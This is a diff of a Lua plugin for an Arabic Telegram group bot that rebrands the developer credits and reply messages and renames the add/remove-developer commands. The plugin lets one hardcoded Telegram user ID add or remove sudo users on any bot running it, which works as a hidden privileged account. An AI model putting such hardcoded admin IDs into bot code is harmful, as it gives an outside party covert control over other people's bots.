@@ -1,12 +1,11 @@
-
 --[[ 
-    _____    _        _    _    _____    Dev @lIMyIl 
-   |_   _|__| |__    / \  | | _| ____|   Dev @li_XxX_il
-     | |/ __| '_ \  / _ \ | |/ /  _|     Dev @h_k_a
-     | |\__ \ | | |/ ___ \|   <| |___    Dev @Aram_omar22
-     |_||___/_| |_/_/   \_\_|\_\_____|   Dev @IXX_I_XXI
-              CH > @lTSHAKEl_CH
---]]
+        _    _       _    _____     _____ ____    ____
+       / \  / \     / \  | ____|___|_   _| /_\ \ / __ \     Đєⱴ 💀: @MaEsTrO_0
+      / / \/ / \   / _ \ |  _| / __| | | | |_\_/| |  | |    Đєⱴ 💀: @devmaestr0
+     / / \ \/ \ \ / ___ \| |___\__ \ | | | | \ \| |__| |    Đєⱴ ฿๏ͳ💀: @iqMaestroBot
+    /_/   \/   \_/_/   \_|_____|___/ |_| |_|  \_\\____/     Đєⱴ ฿๏ͳ💀: @maestr0bot
+                   Đєⱴ Ϲḫ₳ͷͷєℓ💀: @DevMaestro
+—]]
 local function getindex(t,id) 
 for i,v in pairs(t) do 
 if v == id then 
@@ -20,41 +19,30 @@ function reload_plugins( )
   plugins = {} 
   load_plugins() 
 end 
-   function h_k_a(msg, matches) 
+   function maestro(msg, matches) 
     if tonumber (msg.from.id) == 67369633 then 
        if matches[1]:lower() == "اضف مطور" then 
           table.insert(_config.sudo_users, tonumber(matches[2])) 
-      print(matches[2] ..'\nتـمـ ☑️ اضـافـه مـطـور فـي الـبـوتـ ❗️') 
+      print(matches[2] ..'\nتونس تاج راسي سووك مطور ') 
      save_config() 
      reload_plugins(true) 
-      return matches[2] ..'\nتـمـ ☑️ اضـافـه مـطـور فـي الـبـوتـ ❗️' 
+      return matches[2] ..'\nتونس تاج راسي سووك مطور ' 
    elseif matches[1]:lower() == "حذف مطور"  then 
       local k = tonumber(matches[2]) 
           table.remove(_config.sudo_users, getindex( _config.sudo_users, k)) 
-      print(matches[2] ..'\nتـمـ ⚠️ حـذفـ الـمـطـور مـن الـبـوتـ ❗️') 
+      print(matches[2] ..'\nها ضليت تكمز ونزلوووك 😂😂') 
      save_config() 
      reload_plugins(true) 
-      return matches[2] ..'\nتـمـ ⚠️ حـذفـ الـمـطـور مـن الـبـوتـ ❗️' 
+      return matches[2] ..'\nها ضليت تكمز ونزلوووك 😂😂' 
       end 
    end 
 end 
 return { 
 patterns = { 
 "^(اضف مطور) (%d+)$", 
-"^(حذف مطور) (%d+)$",
+"^(احذف مطور) (%d+)$",
 "^[#!/](اضف مطور) (%d+)$", 
-"^[#!/](حذف مطور) (%d+)$"
+"^[#!/](احذف مطور) (%d+)$"
 }, 
-run = h_k_a 
+run = maestro
 }
-
--- تم التعديل و التعريب بواسطه @h_k_a
-
---[[ 
-    _____    _        _    _    _____    Dev @lIMyIl 
-   |_   _|__| |__    / \  | | _| ____|   Dev @li_XxX_il
-     | |/ __| '_ \  / _ \ | |/ /  _|     Dev @h_k_a
-     | |\__ \ | | |/ ___ \|   <| |___    Dev @Aram_omar22
-     |_||___/_| |_/_/   \_\_|\_\_____|   Dev @IXX_I_XXI
-              CH > @lTSHAKEl_CH
---]]
